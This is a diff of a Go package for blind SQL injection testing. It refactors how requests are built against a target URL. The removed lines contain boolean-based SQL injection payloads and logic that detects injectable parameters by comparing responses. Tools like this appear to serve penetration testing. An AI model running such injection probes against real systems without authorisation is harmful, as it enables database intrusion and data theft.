@@ -3,103 +3,59 @@ package blind_injection
 import (
 	"bytes"
 	"fmt"
-	"io"
 	"net/http"
+	"strings"
 )
 
-var falseQuery = "test' AND 1=2 -- "
-var trueQuery = "test' OR 1=1 -- "
-
-type BlindBool struct {
+type Blind struct {
 	Url         string
 	Method      string
 	QParameters []string
 }
 
-func New(url, method string, parameters ...string) *BlindBool {
-	return &BlindBool{
+func New(url, method string, parameters ...string) *Blind {
+	return &Blind{
 		Url:         url,
 		Method:      method,
 		QParameters: parameters,
 	}
 }
 
-func (b *BlindBool) InjectParam() (bool, error) {
-
-	res, err := b.makeRequest(falseQuery)
-	if err != nil {
-		return false, err
-	}
-
-	fSize := res.ContentLength
-	if fSize == -1 {
-		content, err := io.ReadAll(res.Body)
-		if err != nil {
-			return false, err
-		}
-		fSize = int64(len(content))
-	}
-	fStatus := res.StatusCode
-
-	res, err = b.makeRequest(trueQuery)
-	if err != nil {
-		return false, err
-	}
-
-	tSize := res.ContentLength
-	if tSize == -1 {
-		content, err := io.ReadAll(res.Body)
-		if err != nil {
-			return false, err
-		}
-		tSize = int64(len(content))
-	}
-	tStatus := res.StatusCode
-
-	if tStatus == fStatus && fSize == tSize {
-		return false, nil
-	}
-
-	return true, nil
-}
-
-func (b *BlindBool) makeRequest(query string) (*http.Response, error) {
-	var res *http.Response
-	var err error
-
+func (b *Blind) makeRequest(parId int, query string) (res *http.Response, payload string, err error) {
 	switch b.Method {
 	case http.MethodGet:
-		reqStr := b.uriQuery(0, query)
-		res, err = http.Get(reqStr)
+		payload = b.uriQuery(parId, query)
+		res, err = http.Get(payload)
 	case http.MethodPost:
-		bodyQ := b.bodyQuery(0, query)
-		buff := bytes.NewReader([]byte(bodyQ))
+		payload = b.bodyQuery(parId, query)
+		buff := bytes.NewReader([]byte(payload))
 		res, err = http.Post(b.Url, "application/x-www-form-urlencoded", buff)
 	}
-
-	return res, err
+	return
 }
 
-func (b *BlindBool) uriQuery(ind int, query string) string {
-	reqStr := fmt.Sprintf("%s?%s=%s", b.Url, b.QParameters[ind], query)
+func (b *Blind) uriQuery(ind int, query string) string {
+	reqStr := strings.Builder{}
+	reqStr.WriteString(fmt.Sprintf("%s?%s%s", b.Url, b.QParameters[ind], query))
 	for i := 0; i < len(b.QParameters); i++ {
 		if i == ind {
 			continue
 		}
 
-		reqStr = fmt.Sprintf("%s&%s=%s", reqStr, b.QParameters[i], "test")
+		reqStr.WriteString(fmt.Sprintf("&%s", b.QParameters[i]))
 	}
-	return reqStr
+	return reqStr.String()
 }
 
-func (b *BlindBool) bodyQuery(ind int, query string) string {
-	bodyStr := fmt.Sprintf("%s=%s", b.QParameters[ind], query)
+func (b *Blind) bodyQuery(ind int, query string) string {
+	bodyStr := strings.Builder{}
+	bodyStr.WriteString(fmt.Sprintf("%s%s", b.QParameters[ind], query))
 	for i := 0; i < len(b.QParameters); i++ {
 		if i == ind {
 			continue
 		}
-		bodyStr = fmt.Sprintf("%s&%s=%s", bodyStr, b.QParameters[i], "test")
+		bodyStr.WriteString(fmt.Sprintf("&%s", b.QParameters[i]))
 	}
 
-	return bodyStr
+	return bodyStr.String()
 }
